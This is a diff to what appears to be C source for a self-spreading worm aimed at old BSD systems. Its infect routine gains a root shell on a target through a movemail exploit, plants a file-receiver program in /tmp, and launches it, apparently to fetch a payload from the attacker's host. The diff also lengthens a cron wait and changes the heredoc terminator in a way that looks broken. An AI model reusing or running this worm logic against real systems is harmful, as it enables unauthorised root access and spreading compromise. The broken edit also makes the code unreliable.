@@ -81,7 +81,7 @@ fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
 
     write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
     write_to_sock(sock, formatted_source);
-    write_to_sock(sock, "EOF\n");
+    write_to_sock(sock, "\n'EOF'\n");
     sleep(5);
 
     bzero(cmd_buf, IO_BUF_SIZE);
@@ -99,7 +99,6 @@ void infect(ip, my_ip)
     char io_buf[IO_BUF_SIZE];
     char *argv[5];
 
-    /* Initialize buffers with bzero */
     bzero(buf, BUF_SIZE);
     bzero(io_buf, IO_BUF_SIZE);
 
@@ -121,7 +120,8 @@ void infect(ip, my_ip)
     sleep(5);
 
     get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
-    sleep(5);
+    printf("[*] Waiting for cron daemon to execute payload (65s)...\n");
+    sleep(65);
 
     deploy_receive_file(sock, my_ip);
     
@@ -138,7 +138,6 @@ void infect(ip, my_ip)
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
     
-    /* Absolute path is safer in 4.3BSD shells */
     write_to_sock(sock, "/tmp/receive_file &\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
